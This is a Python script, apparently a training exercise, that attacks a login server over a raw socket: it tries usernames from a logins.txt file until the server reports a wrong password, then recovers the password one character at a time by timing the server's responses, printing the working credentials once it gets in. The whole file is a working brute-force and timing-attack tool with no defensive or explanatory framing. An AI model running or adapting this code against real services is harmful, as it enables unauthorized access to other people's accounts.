import argparse
import json
import socket
import itertools
import sys
import time


def count_letters(password):
    num_of_letters = 0

    for char in password:
        if char.isalpha():
            num_of_letters += 1
            continue
    return num_of_letters


def up(let):
    return let.upper()


def low(let):
    return let.lower()


ACTIONS = {0: low,
           1: up}

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="Hack them all!")

    parser.add_argument("ip_address", type=str)
    parser.add_argument("port", type=int)

    ARGS = parser.parse_args()

    client_socket = socket.socket()
    hostname = ARGS.ip_address
    port = ARGS.port
    address = (hostname, port)

    # connecting to the server
    client_socket.connect(address)

    MAIN_DICT = {"login": "", "password": ""}
    LOGIN = ""
    PASSWORD = ""

    with open("logins.txt", "r") as file:
        for login in file.readlines():
            MAIN_DICT["login"] = login.strip()
            json_data = json.dumps(MAIN_DICT)
            data = json_data.encode()
            try:
                client_socket.send(data)
            except BrokenPipeError:
                pass
            response = client_socket.recv(1024)
            response = response.decode()
            response = json.loads(response)

            if response["result"] in ("Wrong password!", "Exception happened during login"):
                LOGIN = MAIN_DICT["login"]
                break

    if not LOGIN:
        sys.exit("login not found!")

    alpha_num = [chr(x) for x in range(ord("A"), ord("z") + 1)] + [chr(x) for x in range(ord("0"), ord("9") + 1)]
    times = []
    while True:
        product = itertools.product(alpha_num)
        for prod in product:
            MAIN_DICT["password"] = PASSWORD + prod[0]
            json_data = json.dumps(MAIN_DICT)
            data = json_data.encode()

            START_TIME = time.perf_counter()

            try:
                client_socket.send(data)
            except BrokenPipeError:
                pass
            response = client_socket.recv(1024)

            END_TIME = time.perf_counter()

            response = response.decode()
            response = json.loads(response)

            if END_TIME - START_TIME >= 0.1:
                PASSWORD = MAIN_DICT["password"]
                break

            if response["result"] == "Connection success!":
                print(json.dumps(MAIN_DICT))
                client_socket.close()
                sys.exit()
